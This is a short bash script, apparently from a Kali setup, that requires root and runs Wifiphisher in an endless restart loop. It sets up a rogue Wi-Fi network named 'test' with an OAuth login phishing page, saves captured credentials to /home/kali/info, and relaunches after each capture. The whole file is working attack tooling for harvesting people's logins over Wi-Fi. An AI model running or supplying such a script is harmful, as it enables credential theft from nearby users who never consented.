#!/bin/bash

# Check if the script is running with root privileges
if [ "$(id -u)" != "0" ]; then
    echo "Please run this script as root or using sudo."
    exit 1
fi

# Infinite loop to keep running Wifiphisher
while true; do
    echo "Running Wifiphisher..."
    sudo wifiphisher -nD -iNM -e test -p oauth-login -cP /home/kali/info --logging -i wlan1 -qS
    echo "Wifiphisher exited. Restarting..."
    sleep 1  # optional delay before restarting
done
